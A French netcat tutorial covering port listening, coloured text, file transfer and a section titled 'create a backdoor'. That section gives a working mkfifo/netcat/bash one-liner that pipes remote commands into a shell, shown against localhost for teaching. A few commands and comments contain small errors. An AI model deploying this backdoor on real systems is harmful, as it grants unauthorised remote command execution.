# Découverte netstat

## Ouvrir un port

Sur un terminal, ouvrir un port

```bash
#serveur
netcat -l 8000
```

Sur un autre terminal, écouter le port

```bash
#client
netcat localhost 8000
```

Taper du texte et constater la conversation entre les deux terminaux

## Envoyer du texte coloré

```bash 
#\033   = code ascii 27 ESC    : 033 en base 8 = 3*8+3=27 en base 16
#\033[  = début séquence ansi
#afficher du texte coloré avec les codes ansi \033[<code>;<code>m      ....  \033[0m     \033=code ascii 27 ESC
# --color=always oblige à conserver les codes couleur (sinon ils sont supprimés dans le pipe)
printf "texte normal\033[0;31mtexte rouge\033[0mtexte normal" --color=always | netcat localhost 8000

#serveur
netcat -l 8000

#client
```

## Créer une porte dérobée

Sur un terminal, ouvrir un port

```bash
#serveur
netcat -l 8000
```

```bash
#client
#/tmp/pipe sert de canal de communication entre bash et notre serveur
#    netcat localhost 8000 | bash   // exécution des commandes par bash
#    bash > /tmp/pipe               // envoi des données dans le pipe
                                    // bash | tee /tmp/pipe
                                    // pour voir aussi le résultat côté client
#    netcat ... < /tmp/pipe         // les données du tuyau (le résultat de bash) sont renvoyés au serveur
mkfifo /tmp/pipe
netcat localhost 8000 < /tmp/pipe | bash | tee /tmp/pipe
```

Sur un autre terminal, envoyer le texte à bash


Depuis le serveur, envoyer des commandes bash. Constater que les commandes bash s'exéutent sur l'autre ordinateur.

```bash
# netcat -l 8000
touch /tmp/x.txt
ls  /tmp/x.txt
```

```bash
netcat localhost 8000 < /tmp/pipe | bash > /tmp/pipe
# RÉSULTAT
#   /tmp/x.txt
```
## Sauvegarder du texte

Sur un terminal, ouvrir un port

```bash
netcat -l 8000
```

Sur un autre terminal, envoyer le texte à bash

```bash
# serveur
netcat-l 8000
# client
netcat localhost 8000 > /tmp/chat.txt
# serveur
ligne1
ligne2
ligne3
# client
cat /tmp/chat.txt
```

## Transférer un fichier avec netcat

### Fichier texte

```bash
# serveur destinataire du fichier
netcat -l 8000 > fichier.test
# client émetteur du fichier
netcat -w 1 localhost 8000  0<index.html
```

### Fichier binaire

```bash
# serveur / réception de l'image
netcat -l 8000 > /tmp/image.png
# client / envoi de l'image
netcat -w 1 localhost 8000 < image.png
echo "il faut maintenant ouvrir image.png pour visualiser"
echo "   vous pouvez utiliser tiv, feh, mspaint.exe, gimp, votre navigateur..."
```
